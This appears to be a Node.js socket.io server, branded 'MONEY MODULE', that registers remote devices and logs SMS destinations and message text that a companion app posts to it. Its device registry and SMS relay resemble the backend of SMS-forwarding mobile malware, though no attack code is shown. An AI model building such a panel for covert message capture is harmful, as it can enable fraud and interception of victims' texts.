const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  transports: ['websocket', 'polling']
});

const connectedDevices = new Map();
const registeredDevices = new Map();

app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'MONEY MODULE Server Running',
    connectedDevices: connectedDevices.size,
    registeredDevices: registeredDevices.size,
    uptime: process.uptime()
  });
});

app.use(express.json());

// SMS Send endpoint - App calls this
app.post('/send', (req, res) => {
  const { deviceId, destNumber, textMessage } = req.body;
  console.log(`[SMS] From ${deviceId}: ${destNumber} - ${textMessage?.substring(0, 50)}`);
  
  if (registeredDevices.has(deviceId)) {
    registeredDevices.get(deviceId).lastSeen = new Date().toISOString();
  }
  
  res.json({ status: "true", message: "SMS received" });
});

io.on('connection', (socket) => {
  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
  console.log(`[CONNECT] ${deviceId}`);
  
  connectedDevices.set(socket.id, { deviceId, connectedAt: new Date().toISOString() });
  
  if (deviceId !== 'unknown') {
    registeredDevices.set(deviceId, { deviceId, socketId: socket.id, registeredAt: new Date().toISOString() });
    console.log(`[REGISTERED] ${deviceId}`);
  }
  
  socket.emit('connected', { message: 'Connected', deviceId, socketId: socket.id });
  
  socket.on('heartbeat', () => socket.emit('heartbeat', { timestamp: Date.now() }));
  socket.on('disconnect', () => connectedDevices.delete(socket.id));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Server started on port ' + PORT));
